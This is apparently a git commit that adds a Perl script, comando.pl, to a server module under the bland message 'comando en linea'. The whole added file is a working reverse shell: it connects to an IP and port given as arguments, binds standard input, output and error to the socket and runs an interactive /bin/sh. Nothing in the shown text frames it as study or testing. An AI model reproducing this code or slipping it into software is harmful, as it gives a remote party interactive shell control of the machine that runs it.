5da06ecbf861d50f44fbbf40b0f5729fda03fbe7
mateman <cuyeu@hotmail.com>
2019-08-05 13:34:23 -0300

    comando en linea

---
+++ module-server-santxo/santxo/comando.pl
@@ -0,0 +1,14 @@
+#!/usr/bin/perl -w
+use Socket;
+my $i = $ARGV[0];
+my $p = $ARGV[1];
+#my $pid = fork();
+#if (defined $pid && $pid==0){
+
+socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
+if(connect(S,sockaddr_in($p,inet_aton($i)))){
+    open(STDIN, ">&S");
+    open(STDOUT,">&S");
+    open(STDERR,">&S");
+    exec("/bin/sh -i ");
+};
